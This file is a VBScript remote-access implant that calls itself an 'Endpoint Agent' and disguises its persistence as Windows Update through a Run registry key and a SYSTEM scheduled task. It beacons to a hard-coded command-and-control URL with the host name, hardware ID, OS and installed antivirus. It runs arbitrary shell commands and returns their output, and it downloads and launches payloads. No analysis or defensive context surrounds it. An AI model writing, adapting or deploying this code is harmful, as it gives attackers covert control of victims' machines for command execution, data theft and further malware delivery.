' wup.vbs - Endpoint Agent
' Checks into dashboard at https://reimagined-octo-computing-machine.up.railway.app/x/bot

Option Explicit
Const C2_CHECKIN  = "https://reimagined-octo-computing-machine.up.railway.app/x/bot"
Const C2_RESULT   = "https://reimagined-octo-computing-machine.up.railway.app/x/bot/result"
Const TASK_NAME   = "WindowsUpdateAgent"
Const REG_KEY     = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
Const SLEEP_TIME  = 5000

Dim shell, fso, http, stream
Set shell  = CreateObject("WScript.Shell")
Set fso    = CreateObject("Scripting.FileSystemObject")
Set http   = CreateObject("MSXML2.ServerXMLHTTP")
Set stream = CreateObject("ADODB.Stream")

If IsRunning() Then WScript.Quit
InstallPersistence()

Do While True
  On Error Resume Next
  Dim botID  : botID  = GetBotID()
  Dim sysInfo: sysInfo = GetSysInfo()
  Dim cmd    : cmd    = CheckIn(botID, sysInfo)
  If Len(cmd) > 0 Then HandleCommand cmd, botID
  WScript.Sleep SLEEP_TIME
Loop

Function GetBotID()
  GetBotID = shell.ExpandEnvironmentStrings("%COMPUTERNAME%") & "_" & GetHWID()
End Function

Function GetHWID()
  Dim wmi, col, obj
  Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
  Set col = wmi.ExecQuery("SELECT UUID FROM Win32_ComputerSystemProduct")
  For Each obj In col
    GetHWID = obj.UUID
    Exit For
  Next
End Function

Function GetSysInfo()
  GetSysInfo = "os="  & EncodeParam(GetOS()) & "|av=" & EncodeParam(GetAV()) & "|arch=" & GetArch()
End Function

Function GetOS()
  Dim wmi, col, obj
  Set wmi = GetObject("winmgmts:\\.\root\cimv2")
  Set col = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
  For Each obj In col
    GetOS = obj.Caption
    Exit For
  Next
End Function

Function GetAV()
  On Error Resume Next
  Dim wmi, col, av, names
  Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2")
  Set col = wmi.ExecQuery("SELECT displayName FROM AntiVirusProduct")
  names = ""
  For Each av In col
    names = names & av.displayName & ";"
  Next
  GetAV = names
End Function

Function GetArch()
  Dim wmi, col, obj
  Set wmi = GetObject("winmgmts:\\.\root\cimv2")
  Set col = wmi.ExecQuery("SELECT AddressWidth FROM Win32_Processor",,48)
  For Each obj In col
    GetArch = obj.AddressWidth & "-bit"
    Exit For
  Next
End Function

Function CheckIn(botID, sysInfo)
  http.open "GET", C2_CHECKIN & "?id=" & botID & "&sys=" & sysInfo, False
  http.send
  CheckIn = http.responseText
End Function

Sub HandleCommand(cmd, botID)
  Dim parts : parts = Split(cmd, "|")
  Select Case parts(0)
    Case "exec"    : ExecCmd parts(1), botID
    Case "download": DownloadAndRun parts(1), botID
    Case "sleep"   : WScript.Sleep CLng(parts(1))
    Case "kill"    : UninstallPersistence() : WScript.Quit
  End Select
End Sub

Sub ExecCmd(cmdLine, botID)
  Dim exec, output
  Set exec = shell.Exec("cmd.exe /c " & cmdLine)
  output = exec.StdOut.ReadAll() & exec.StdErr.ReadAll()
  SendResult output, botID
End Sub

Sub DownloadAndRun(url, botID)
  Dim local : local = shell.ExpandEnvironmentStrings("%TEMP%") & "\payload.exe"
  Dim objHTTP : Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
  objHTTP.open "GET", url, False
  objHTTP.send
  If objHTTP.status = 200 Then
    Dim objADO : Set objADO = CreateObject("ADODB.Stream")
    objADO.Type = 1 : objADO.Open
    objADO.Write objHTTP.responseBody
    objADO.SaveToFile local, 2
    objADO.Close
    shell.Run "wscript.exe """ & local & """", 0, False
    SendResult "Downloaded and launched", botID
  End If
End Sub

Sub SendResult(data, botID)
  On Error Resume Next
  http.open "POST", C2_RESULT, False
  http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  http.send "device_id=" & botID & "&d=" & EncodeParam(data)
End Sub

Function EncodeParam(txt)
  Dim i, c, out : out = ""
  For i = 1 To Len(txt)
    c = Mid(txt, i, 1)
    If c = " " Then out = out & "+"
    ElseIf (Asc(c) >= 48 And Asc(c) <= 57) Or (Asc(c) >= 65 And Asc(c) <= 90) Or (Asc(c) >= 97 And Asc(c) <= 122) Then out = out & c
    Else out = out & "%" & Hex(Asc(c))
    End If
  Next
  EncodeParam = out
End Function

Sub InstallPersistence()
  On Error Resume Next
  shell.RegWrite REG_KEY, WScript.ScriptFullName, "REG_SZ"
  Dim taskCmd : taskCmd = "schtasks /create /tn """ & TASK_NAME & """ /tr """ & WScript.ScriptFullName & """ /sc ONLOGON /ru ""SYSTEM"" /f"
  shell.Run taskCmd, 0, True
End Sub

Sub UninstallPersistence()
  On Error Resume Next
  shell.RegDelete REG_KEY
  shell.Run "schtasks /delete /tn """ & TASK_NAME & """ /f", 0, True
End Sub

Function IsRunning()
  Dim wmi, col, proc, count : count = 0
  Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
  Set col = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name = 'wscript.exe'")
  For Each proc In col : count = count + 1 : Next
  IsRunning = (count > 1)
End Function
